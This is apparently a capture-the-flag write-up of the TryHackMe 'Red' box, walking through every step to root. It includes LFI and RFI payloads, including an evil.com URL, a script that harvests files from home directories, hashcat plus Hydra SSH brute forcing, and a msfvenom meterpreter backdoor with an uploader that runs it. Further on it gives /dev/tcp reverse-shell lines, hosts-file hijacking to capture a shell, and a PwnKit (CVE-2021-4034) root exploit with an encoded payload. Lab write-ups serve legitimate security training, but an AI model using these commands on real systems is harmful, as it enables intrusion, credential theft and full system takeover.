![red-blue](red-writeup.png)

<br>

This box is labeled as an "Easy" box on TryHackMe, but in reality, it feels more like a "Medium" box due to the extensive knowledge required for the techniques involved. We started with basic exploration, clicking around the website, performing directory listings, service enumeration, fuzzing, and other methods until we discovered that the website was vulnerable to LFI. From there, we began digging into user information, hoping to find some useful details. After a few minutes, we got valuable information about the blue user, which we could use for SSH cracking. However, progressing to the blue user was challenging because we kept getting kicked out after just a few seconds. The great thing about this box is that it was designed with clues to help us avoid falling into rabbit holes. Eventually, we identified a misconfiguration in the red user and gained access using DNS hijacking techniques. Once inside, we found an older version of Polkit, which, after some quick research, turned out to be vulnerable to local privilege escalation. Using the proof of concept, we successfully compromised the entire system and obtained all the necessary details. thanks for reading ✌️

<br>

![rec1](rec1.png)
![clue](clue.png)
![another-clue](another-clue.png)

## Debugging Web application Contents
![caido](caido.png) 

## Inspecting HTTP Response Headers and Sitemaps
```bash
$ curl -I red.thm      
HTTP/1.1 302 Found
Date: Redacted
Server: Apache/2.4.41 (Ubuntu)
Location: /index.php?page=home.html
Content-Type: text/html; charset=UTF-8
```
## Service Enumeration
```bash
$ nmap -sC -sV -Pn -vv $(nmap --min-rate=10000 -T4 -p- red.thm | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' '.' | sed 's/,$//') red.thm

Nmap scan report for red.thm (10.10.201.142)
Host is up, received user-set (0.35s latency).
Scanned at Redacted PST for 20s
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e2:74:1c:e0:f7:86:4d:69:46:f6:5b:4d:be:c3:9f:76 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC1MTQvnXh8VLRlrK8tXP9JEHtHpU13E7cBXa1XFM/TZrXXpffMfJneLQvTtSQcXRUSvq3Z3fHLk4xhM1BEDl+XhlRdt+bHIP4O5Myk8qLX9E1FFpcy3NrEHJhxCCY/SdqrK2ZXyoeld1Ww+uHpP5UBPUQQZNypxYWDNB5K0tbDRU+Hw+p3H3BecZwue1J2bITy6+Y9MdgJKKaVBQXHCpLTOv3A7uznCK6gLEnqHvGoejKgFXsWk8i5LJxJqsHtQ4b+AaLS9QAy3v9EbhSyxAp7Zgcz0t7GFRgc4A5LBFZL0lUc3s++AXVG0hJ9cdVTBl282N1/hF8PG4T6JjhOVX955sEBDER4T6FcCPehqzCrX0cEeKX6y6hZSKnT4ps9kaazx9O4slrraF83O9iooBTtvZ7iGwZKiCwYFOofaIMv+IPuAJJuRT0156NAl6/iSHyUM3vD3AHU8k7OISBkndyAlvYcN/ONGWn4+K/XKxkoXOCW1xk5+0sxdLfMYLk2Vt8=
|   256 fb:84:73:da:6c:fe:b9:19:5a:6c:65:4d:d1:72:3b:b0 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDooZFwx0zdNTNOdTPWqi+z2978Kmd6db0XpL5WDGB9BwKvTYTpweK/dt9UvcprM5zMllXuSs67lPNS53h5jlIE=
|   256 5e:37:75:fc:b3:64:e2:d8:d6:bc:9a:e6:7e:60:4d:3c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDyWZoVknPK7ItXpqVlgsise5Vaz2N5hstWzoIZfoVDt
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
| http-title: Atlanta - Free business bootstrap template
|_Requested resource was /index.php?page=home.html
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
## Technologies Stack 
![tech-stack](tech-stack.png)

## Directory and Files listing
```bash
$ feroxbuster -u http://red.thm -w /usr/share/seclists/Discovery/Web-Content/big.txt --scan-dir-listings
                                                                                                                                                                                
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://red.thm
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/big.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 📂  Scan Dir Listings     │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────

302      GET    http://red.thm/ => http://red.thm/index.php?page=home.html
301      GET    http://red.thm/assets => http://red.thm/assets/
200      GET    http://red.thm/assets/js/headroom.min.js
200      GET    http://red.thm/assets/js/jquery.headroom.min.js
200      GET    http://red.thm/assets/js/jquery.cslider.js
200      GET    http://red.thm/assets/images/favicon.png
200      GET    http://red.thm/assets/css/da-slider.css
200      GET    http://red.thm/assets/css/font-awesome.min.css
200      GET    http://red.thm/assets/js/jquery.isotope.min.js
200      GET    http://red.thm/assets/images/2.jpg
200      GET    http://red.thm/assets/fonts/fontawesome.otf
200      GET    http://red.thm/assets/fonts/fontawesome-webfont.ttf
200      GET    http://red.thm/assets/fonts/fontawesome-webfont.eot
200      GET    http://red.thm/assets/images/person_2.png
200      GET    http://red.thm/assets/js/modernizr-latest.js
200      GET    http://red.thm/assets/images/person_1.png
200      GET    http://red.thm/assets/images/bg_header.jpg
200      GET    http://red.thm/assets/images/arrows.png
200      GET    http://red.thm/assets/css/isotope.css
200      GET    http://red.thm/assets/css/style.css
200      GET    http://red.thm/assets/css/bootstrap-theme.css
200      GET    http://red.thm/assets/images/logo.png
200      GET    http://red.thm/assets/js/html5shiv.js
200      GET    http://red.thm/assets/js/respond.min.js
200      GET    http://red.thm/assets/js/custom.js
200      GET    http://red.thm/assets/js/google-map.js
200      GET    http://red.thm/assets/fonts/fontawesome-webfont.woff
200      GET    http://red.thm/assets/images/person_3.png
200      GET    http://red.thm/assets/images/logo1.png
200      GET    http://red.thm/assets/css/bootstrap.min.css
200      GET    http://red.thm/assets/images/about.jpg
301      GET    http://red.thm/assets/js => http://red.thm/assets/js/
200      GET    http://red.thm/assets/images/1.jpg
200      GET    http://red.thm/assets/fonts/fontawesome-webfont.svg
200      GET    http://red.thm/assets/images/bg_header%20-%20copy.jpg
301      GET    http://red.thm/assets/js/images => http://red.thm/assets/js/images/
301      GET    http://red.thm/assets/fonts => http://red.thm/assets/fonts/
301      GET    http://red.thm/assets/images/portfolio => http://red.thm/assets/images/portfolio/
301      GET    http://red.thm/assets/css => http://red.thm/assets/css/
301      GET    http://red.thm/assets/js/fancybox => http://red.thm/assets/js/fancybox/
301      GET    http://red.thm/assets/images => http://red.thm/assets/images/

```
## Common Vulnerability 
1. Local File Inclusion (LFI)

- Description: The page parameter could allow the inclusion of files from the local filesystem.
    - Risk:
      Attackers may read sensitive files like /etc/passwd or application configuration files.
        Can lead to code execution if the included file contains malicious PHP code.
        - Testing:
            - Try including /etc/passwd:
            `http://red.thm/index.php?page=../../../../etc/passwd`
            - Include a log file with user-controlled input: 
            `http://red.thm/index.php?page=../../../../var/log/apache2/access.log`

2. Remote File Inclusion (RFI)

- Description: If the application allows remote file paths, attackers may include files hosted on a malicious server.
    - Risk:
        Remote code execution by including malicious scripts.
        - Testing:
            - Inject a remote URL:
            `http://red.thm/index.php?page=http://evil.com/malicious.txt`  

3. Directory Traversal

- Description: The page parameter might allow directory traversal attacks to access files outside the intended directory.
    - Risk:
        Unauthorized access to files and sensitive information disclosure.
        - Testing:
            - Attempt to traverse directories: 
            `http://red.thm/index.php?page=../../../../var/www/html/config.php`     

 

4. Cross-Site Scripting (XSS)

- Description: If the page parameter reflects user input into the webpage, it might be vulnerable to XSS.
    - Risk:
        - Stealing cookies or session tokens.
        - Defacing the website.
    - Testing:
        - Inject a script: `http://red.thm/index.php?page=<script>alert('XSS')</script>`   

 

5. Parameter Tampering

- Description: Attackers might tamper with the page parameter to access unintended resources or bypass authentication.
    - Risk:
        - Privilege escalation.
        - Unauthorized access to hidden files.
    - Testing:
        - Try accessing restricted files: `http://red.thm/index.php?page=admin.html`


## Vulnerability Identification
"We tested the website for Local File Inclusion (LFI) vulnerabilities by analyzing the `page` parameter and successfully confirmed that it is indeed vulnerable to LFI."
```bash
$ python3 lfimap.py -U "http://red.thm/index.php?page=testme" -a -v                              
[i] Session information is not provided. LFImap might have troubles finding vulnerabilities if testing endpoint requires authentication.

[i] Testing GET 'page' parameter...

[i] Testing misc issues using heuristics...
[i] Testing for XSS...
[i] Testing for CRLF...
[i] Testing for error-based info leak...
[i] Testing for open redirect...
[i] Testing with filter wrapper...
[+] LFI -> 'http://red.thm/index.php?page=php%3A%2F%2Ffilter%2Fresource%3D%2Fetc%2Fpasswd'
[i] Testing with input wrapper...
[i] Testing with data wrapper...
[i] Testing with expect wrapper...
[i] Testing with file wrapper...
[+] LFI -> 'http://red.thm/index.php?page=file%3A%2F%2F%2Fetc%2Fpasswd'
[i] Testing remote file inclusion...
[i] Trying to include internet-hosted file...
...

----------------------------------------
LFImap finished with execution.
Parameters tested: 1
Requests sent: 41
Vulnerabilities found: 2
```
```bash
$ curl http://red.thm/index.php?page=php%3A%2F%2Ffilter%2Fresource%3D%2Fetc%2Fpasswd -o passwd.txt 

$ cat passwd.txt | grep 100 
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
blue:x:1000:1000:blue:/home/blue:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
red:x:1001:1001::/home/red:/bin/bash

```

## Post Enumeration (Fuzzing) 
"So, while digging around, I thought, why not create a tool that grabs a list of important files from the home directories of both the red and blue users and checks for any juicy information?"

> lfi-fuzzer.sh
```bash
#!/bin/bash

# Target URL with vulnerable parameter
BASE_URL="http://red.thm/index.php?page="
ENCODED_PAYLOAD="php://filter/resource="

# check usernames
USERNAMES=("blue" "red")

# Found in "/usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt"
IMPORTANT_FILES=(
    ".bashrc"
    ".bash_history"
    ".profile"
    ".ssh/authorized_keys"
    ".ssh/id_rsa"
    ".ssh/id_rsa.pub"
    ".ssh/config"
    ".gitconfig"
    ".env"
)

# scan files in a user's home directory
scan_home_directory() {
    local username=$1
    echo "[*] Scanning /home/$username for important files..."

    # loop through each important file to check its existence
    for file in "${IMPORTANT_FILES[@]}"; do
        target="${ENCODED_PAYLOAD}/home/$username/$file"
        
        # make the request and check if the file exists
        response=$(curl -s "${BASE_URL}${target}")
        if [[ -n $response && ! $response =~ "No such file" ]]; then
            echo "[+] Found: /home/$username/$file"
        else
            echo "[-] Not Found: /home/$username/$file"
        fi
    done
}

# scan all usernames
for user in "${USERNAMES[@]}"; do
    scan_home_directory "$user"
done
```
### Result
```bash
$ bash lfi-fuzzer.sh                                                                       
[*] Scanning /home/blue for important files...
[+] Found: /home/blue/.bashrc
[+] Found: /home/blue/.bash_history
[+] Found: /home/blue/.profile
[-] Not Found: /home/blue/.ssh/authorized_keys
[-] Not Found: /home/blue/.ssh/id_rsa
[-] Not Found: /home/blue/.ssh/id_rsa.pub
[-] Not Found: /home/blue/.ssh/config
[-] Not Found: /home/blue/.gitconfig
[-] Not Found: /home/blue/.env
[*] Scanning /home/red for important files...
[+] Found: /home/red/.bashrc
[-] Not Found: /home/red/.bash_history
[+] Found: /home/red/.profile
[-] Not Found: /home/red/.ssh/authorized_keys
[-] Not Found: /home/red/.ssh/id_rsa
[-] Not Found: /home/red/.ssh/id_rsa.pub
[-] Not Found: /home/red/.ssh/config
[-] Not Found: /home/red/.gitconfig
[-] Not Found: /home/red/.env
```
```bash
$ curl http://red.thm/index.php?page=php://filter/resource=/home/blue/.bash_history -o -
echo "Red rules"
cd
hashcat --stdout .reminder -r /usr/share/hashcat/rules/best64.rule > passlist.txt
cat passlist.txt
rm passlist.txt
sudo apt-get remove hashcat -y
```
The hashcat is used temporarily to generate possible password candidates before being uninstalled for cleanup purposes.
```bash
hashcat --stdout .reminder -r /usr/share/hashcat/rules/best64.rule > passlist.txt
```
- `--stdout`: This option outputs the generated wordlist to the standard output (terminal) instead of attempting to crack a hash.
- `.reminder`: This is likely a file that contains some base wordlist, which Hashcat will use to generate password combinations.
- `-r /usr/share/hashcat/rules/best64.rule`: This applies a set of best64 rules from Hashcat's rule file. These rules modify the input wordlist to create variations like adding numbers, symbols, or common password patterns.
- `> passlist.txt`: The output (the generated password list) is redirected to a file named passlist.txt.
```bash
$ curl http://red.thm/index.php?page=php://filter/resource=/home/blue/.reminder -o -    

sup3r_p@s$w0rd!

```
## Password Cracking 
```bash
# file creation and append strings
$ touch pass.lst && echo 'sup3r_p@s$w0rd!' > pass.lst 

# Generating possible password list 
$ hashcat --stdout pass.lst -r /usr/share/hashcat/rules/best64.rule > passlist.txt

# Generated length 
$ cat passlist.txt | wc -l 
77 

# results
$ cat passlist.txt | head -20
sup3r_p@s$w0rd!
!dr0w$s@p_r3pus
SUP3R_P@S$W0RD!
Sup3r_p@s$w0rd!
sup3r_p@s$w0rd!0
sup3r_p@s$w0rd!1
sup3r_p@s$w0rd!2
sup3r_p@s$w0rd!3
sup3r_p@s$w0rd!4
sup3r_p@s$w0rd!5
sup3r_p@s$w0rd!6
sup3r_p@s$w0rd!7
sup3r_p@s$w0rd!8
sup3r_p@s$w0rd!9
sup3r_p@s$w0rd!00
sup3r_p@s$w0rd!01
sup3r_p@s$w0rd!02
sup3r_p@s$w0rd!11
sup3r_p@s$w0rd!12
sup3r_p@s$w0rd!13
```
## Hydra ssh 
```bash
$ hydra -l blue -P passlist.txt  -t 1  red.thm ssh         
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

...
[DATA] max 1 task per 1 server, overall 1 task, 77 login tries (l:1/p:77), ~77 tries per task
[DATA] attacking ssh://red.thm:22/
[STATUS] 16.00 tries/min, 16 tries in 00:01h, 61 to do in 00:04h, 1 active
[22][ssh] host: red.thm   login: blue   password: sup3r_p@s$w0rd!123
1 of 1 target successfully completed, 1 valid password found
```
## Initial access  
```bash
# ssh creds 
username: blue 
password: sup3r_p@s$w0rd!123 
```
```bash
$ ssh blue@red.thm            
The authenticity of host 'red.thm (10.10.201.142)' can't be established.
ED25519 key fingerprint is SHA256:Jw5VYW4+TkPGUq5z4MEIujkfaV/jzH5rIHM6bxyug/Q.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'red.thm' (ED25519) to the list of known hosts.
blue@red.thm's password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-124-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System load:  0.24              Processes:             146
  Usage of /:   64.8% of 8.87GB   Users logged in:       0
  Memory usage: 9%                IPv4 address for eth0: 10.10.201.142
  Swap usage:   0%


55 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


6 updates could not be installed automatically. For more details,
see /var/log/unattended-upgrades/unattended-upgrades.log

*** System restart required ***
Last login: Mon Apr 24 22:18:08 2023 from 10.13.4.71

blue@red:~$ Oh let me guess, you are going to go to the /tmp or /dev/shm directory to run linpeas? Yawn
Say Bye Bye to your Shell Blue and that password
Connection to red.thm closed by remote host.
Connection to red.thm closed.
```
"After successfully logging in with the credentials obtained from Hydra, I was automatically logged out, and those passwords couldn't be reused after a few seconds. Before being kicked out, they left a clue: 'Oh, let me guess, you're going to head to the /tmp or /dev/shm directory to run linpeas?'"

## Interpretation of the clue

"Its likely hinting that after logging in, they expect you to use linpeas from these directories to gather information about the system." 

- Files in `/tmp` can sometimes have less restrictive permissions, making them easier to manipulate.
- `/dev/shm` This is a temporary filesystem (stored in memory) that is often used for sharing data between processes.
 
## Crafting backdoor
"I decided to create a backdoor using msfvenom, hoping to establish a stable connection. However, in the end, it didn’t work as expected because all the outbound connections and files placed by the blue user got deleted."
```bash
$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="10.23.42.147" LPORT=4444 -f elf > revshell.elf
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 123 bytes
Final size of elf file: 207 bytes
```
## Uploading backdoor 
"I also created a script that automatically login and uploads the backdoor whenever we get the new password for the blue user, since the connection keeps dropping every few random seconds."
```bash
$ python3 -m venv venv-ssh && source venv-ssh/bin/activate
$ pip install paramiko 
```
```py
import paramiko
import os
import logging

# Enable Paramiko debugging
paramiko.util.log_to_file("paramiko.log")

# SSH connection details
host = "red.thm"  
port = 22   
username = "blue"  
password = 'sup3r_p@s$w0sup3r_p@s$w0'  
local_file_path = "/home/kali/red/revshell.elf"   
remote_file_path = "/tmp/revshell.elf"  

 
if not os.path.exists(local_file_path):
    print(f"Error: The file {local_file_path} does not exist.")
    exit(1)

try:
    # Create SSH client
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    # Connect to the remote host
    print(f"Connecting to {host}...")
    ssh.connect(host, port=port, username=username, password=password)
    print("Connected successfully!")

    # Create an SFTP session for file upload
    sftp = ssh.open_sftp()
    print(f"Uploading {local_file_path} to {remote_file_path}...")
    sftp.put(local_file_path, remote_file_path)
    print(f"File uploaded to {remote_file_path} successfully.")

    # Make the uploaded file executable
    print(f"Changing file permissions to make it executable: {remote_file_path}")
    ssh.exec_command(f"chmod +x {remote_file_path}")
    
    # Run the uploaded file
    print(f"Running the file: {remote_file_path}")
    stdin, stdout, stderr = ssh.exec_command(f"{remote_file_path}")
    
    print("Command output:")
    print(stdout.read().decode())   
    print("Error output:")
    print(stderr.read().decode())  
    
    # Close the SFTP session and SSH connection
    sftp.close()
    ssh.close()

    print("SSH session closed.")

except paramiko.AuthenticationException:
    print("Authentication failed, please check your username/password.")
except paramiko.SSHException as e:
    print(f"SSH error: {e}")
except Exception as e:
    print(f"An error occurred: {e}")
```
```bash
$ python3 backdoor.py 
Connecting to red.thm...
Connected successfully!
Uploading /home/kali/red/revshell.elf to /tmp/revshell.elf...
File uploaded to /tmp/revshell.elf successfully.
Changing file permissions to make it executable: /tmp/revshell.elf
Running the file: /tmp/revshell.elf
Command output:

Error output:

SSH session closed.
Exception ignored in: <function BufferedFile.__del__ at 0x7f7bcc90ac00>
Traceback (most recent call last):
...
...
```
```bash
meterpreter > sysinfo 
Computer     : 10.10.99.103
OS           : Ubuntu 20.04 (Linux 5.4.0-124-generic)
Architecture : x64
BuildTuple   : i486-linux-musl
Meterpreter  : x86/linux
meterpreter > shell
Process 2020 created.
Channel 1 created.
whoami
blue
python3 -c 'import pty;pty.spawn("/bin/bash")'
blue@red:~$ id 
id 
uid=1000(blue) gid=1000(blue) groups=1000(blue)
blue@red:~$ La la la la la la la la la la la la la la la la
There is no way you are going to own this machine
Say Bye Bye to your Shell Blue and that password
Fine fine, just run sudo -l and then enter this password WW91IHJlYWxseSBzdWNrIGF0IHRoaXMgQmx1ZQ==

[*] 10.10.99.103 - Meterpreter session 1 closed.  Reason: Died
```
```bash
$ echo "WW91IHJlYWxseSBzdWNrIGF0IHRoaXMgQmx1ZQ==" | base64 -d 
You really suck at this Blue 
```
## Linpeas
![writable](writable.png)

## Cron (pspy)
```bash
# kali terminal
$ python3 -m http.server 8080 

# target terminal 
$ wget http://ip:8080/pspy && ./pspy > pspy_result.txt 
```
```bash
# kali 
$ scp -i blue blue@red.thm:/tmp/pspy.txt . 
```
## Pspy 
```bash
$ cat pspy.txt | grep UID=1001

REDACTED CMD: UID=1001  PID=111359 | bash -c nohup bash -i >& /dev/tcp/redrules.thm/9001 0>&1 & 
REDACTED CMD: UID=1001  PID=111336 | bash -c nohup bash -i >& /dev/tcp/redrules.thm/9001 0>&1 & 
REDACTED CMD: UID=1001  PID=111536 | sh 
REDACTED CMD: UID=1001  PID=111533 | /bin/sh -c echo YmFzaCAtYyAnbm9odXAgYmFzaCAtaSA+JiAvZGV2L3RjcC9yZWRydWxlcy50aG0vOTAwMSAwPiYxICYn | base64 -d | sh 
REDACTED CMD: UID=1001  PID=111538 | sh 
REDACTED CMD: UID=1001  PID=111545 | bash -c nohup bash -i >& /dev/tcp/redrules.thm/9001 0>&1 & 
REDACTED CMD: UID=1001  PID=111653 | bash -c nohup bash -i >& /dev/tcp/redrules.thm/9001 0>&1 & 
REDACTED CMD: UID=1001  PID=111651 | 
REDACTED CMD: UID=1001  PID=111649 | sh 
REDACTED CMD: UID=1001  PID=111645 | /bin/sh -c echo YmFzaCAtYyAnbm9odXAgYmFzaCAtaSA+JiAvZGV2L3RjcC9yZWRydWxlcy50aG0vOTAwMSAwPiYxICYn | base64 -d | sh 
REDACTED CMD: UID=1001  PID=111683 | bash -c nohup bash -i >& /dev/tcp/redrules.thm/9001 0>&1 & 
```
```bash
bash -c nohup bash -i >& /dev/tcp/redrules.thm/9001 0>&1 & 
```

## DNS Spoofing / Hijacking hosts file

```bash
blue@red:~$ echo "10.23.42.147 redrules.thm" | tee -a /etc/hosts
10.23.42.147 redrules.thm

blue@red:~$ cat /etc/hosts
127.0.0.1 localhost
127.0.1.1 red
192.168.0.1 redrules.thm

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouter
10.23.42.147 redrules.thm

blue@red:~$ 
```
## Listener
```bash
$ time rlwrap -cAr nc -lvnp 9001                   
listening on [any] 9001 ...
connect to [10.23.42.147] from (UNKNOWN) [10.10.99.103] 57952
bash: cannot set terminal process group (112780): Inappropriate ioctl for device
bash: no job control in this shell
red@red:~$ 

real	49.12s
user	0.00s
sys	0.01s
cpu	0%                  
```
```bash
red@red:~$ ls -al 
ls -al 
total 36
drwxr-xr-x 4 root red  4096 Aug 17  2022 .
drwxr-xr-x 4 root root 4096 Aug 14  2022 ..
lrwxrwxrwx 1 root root    9 Aug 14  2022 .bash_history -> /dev/null
-rw-r--r-- 1 red  red   220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 red  red  3771 Feb 25  2020 .bashrc
drwx------ 2 red  red  4096 Aug 14  2022 .cache
-rw-r----- 1 root red    41 Aug 14  2022 flag2
drwxr-x--- 2 red  red  4096 Aug 14  2022 .git
-rw-r--r-- 1 red  red   807 Aug 14  2022 .profile
-rw-rw-r-- 1 red  red    75 Aug 14  2022 .selected_editor
-rw------- 1 red  red     0 Aug 17  2022 .viminfo
 
red@red:~/.git$ ls -al
ls -al
 
# SUID permissions
-rwsr-xr-x 1 root root 31032 Aug 14  2022 pkexec

red@red:~/.git$ ./pkexec 
./pkexec 
pkexec --version |
       --help |
       --disable-internal-agent |
       [--user username] PROGRAM [ARGUMENTS.    ..]

See the pkexec manual page for more details.

red@red:~/.git$ ./pkexec  --version
./pkexec  --version
pkexec version 0.105
```
![poc](poc.png)

## Gaining Root 
> Reference: PoC - https://github.com/joeammond/CVE-2021-4034/tree/main
```bash
$ msfvenom -p linux/x64/exec -f elf-so PrependSetuid=true | base64
...
...
Payload size: 29 bytes
Final size of elf-so file: 431 bytes

f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAAkgEAAAAAAABAAAAAAAAAALAAAAAAAAAAAAAAAEAAOAAC
AEAAAgABAAEAAAAHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAArwEAAAAAAADMAQAAAAAAAAAQ
AAAAAAAAAgAAAAcAAAAwAQAAAAAAADABAAAAAAAAMAEAAAAAAABgAAAAAAAAAGAAAAAAAAAAABAA
AAAAAAABAAAABgAAAAAAAAAAAAAAMAEAAAAAAAAwAQAAAAAAAGAAAAAAAAAAAAAAAAAAAAAIAAAA
AAAAAAcAAAAAAAAAAAAAAAMAAAAAAAAAAAAAAJABAAAAAAAAkAEAAAAAAAACAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAwAAAAAAAAAkgEAAAAAAAAFAAAAAAAAAJABAAAAAAAABgAAAAAA
AACQAQAAAAAAAAoAAAAAAAAAAAAAAAAAAAALAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAASDH/amlYDwVIuC9iaW4vc2gAmVBUX1JeajtYDwU=
```
```bash
# change path 
libc.execve(b'/home/red/.git/pkexec', c_char_p(None), environ_p)
```
```bash
$ python3 -m http.server 8000

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.213.183 - - [Redacted] "GET /CVE-2021-4034.py HTTP/1.1" 200 -
```
```bash
red@red:~/.git$ ls -al 
CVE-2021-4034.py
pkexec

red@red:~/.git$ python3 CVE-2021-4034.py

id
uid=0(root) gid=1001(red) groups=1001(red)
python3 -c 'import pty;pty.spawn("/bin/bash")'

root@red:/home/red/.git# cd /root

root@red:/root# ls

defense  flag3  snap

root@red:/root/defense# ls -al

total 36
drwxr-xr-x 2 root root 4096 Apr 24  2023 .
drwx------ 6 root root 4096 Apr 24  2023 ..
-rw-r--r-- 1 root root  146 Apr  7  2023 backup.sh
-rw-r--r-- 1 root root  166 Mar 14  2023 blue_history
-rw-r--r-- 1 root root  671 Aug 14  2022 change_pass.sh
-rw-r--r-- 1 root root  101 Apr  7  2023 clean_red.sh
-rw-r--r-- 1 root root  242 Apr  7  2023 hosts
-rw-r--r-- 1 root root  216 Mar 14  2023 kill_sess.sh
-rw-r--r-- 1 root root 1300 Apr 24  2023 talk.sh
root@red:/root/defense# 
```

## Flags
```bash
# flag1
THM{Is_thAt_all_****_can_d0_*****}

# flag 2
THM{Y0u_won't_****_IT_furTH3r_****_th1S}

# root 
THM{Go0d_****_****_GG}
```
![done](done.png)

I know some of you are curious about what my setup looks like when playing CTFs, Here's how I organize my terminals.
but, during actual penetration testing or hacking, my terminal arrangement is different and tailored to the task at hand.

- **VPN Monitoring Terminal**: I dedicate one terminal solely to monitoring the THM VPN connection. Sometimes, while playing, we don't realize that the VPN connection has dropped, so having this terminal helps me stay aware.

- **Tunnel Terminals**: I use two terminals specifically for handling tun0. This is because we often forget our VPN IP, and having a terminal for quick reference makes things much easier.

- **Hosts File Terminal**: Another terminal is reserved for working with the /etc/hosts file. This is particularly useful for quickly mapping the target machine’s IP to a domain name for convenience during the game.

- **And the other are the target domain working terminal**: I also have a terminal dedicated to working on the target domain. This is where most of the actual reconnaissance and exploitation work happens.

![terminal](terminal.png)
